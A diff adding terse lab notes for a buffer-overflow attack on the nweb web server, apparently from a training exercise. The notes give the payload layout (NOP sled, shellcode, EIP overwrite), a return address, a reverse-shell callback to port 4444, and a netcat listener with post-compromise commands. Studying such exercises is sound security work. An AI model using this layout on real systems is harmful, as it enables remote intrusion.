@@ -1,0 +1,20 @@
+1032 0x42122ba7
+
+redhat8 ip address for shellcode
+
+./nweb 8888 . //Running nweb on port 8888
+
+gdb -core core.
+
+172.16.215.1 port 4444 // Return shell on port 4444
+834 NOP + 198 shell + 4 EIP = 1036
+434
+
+Victim Machine - Test Connection
+nc 10.247.4.156 8888
+GET /index.html HTTP/1.0
+
+Attack Machine (Shell Returned) Login
+nc -lp portnum
+ls
+whoami
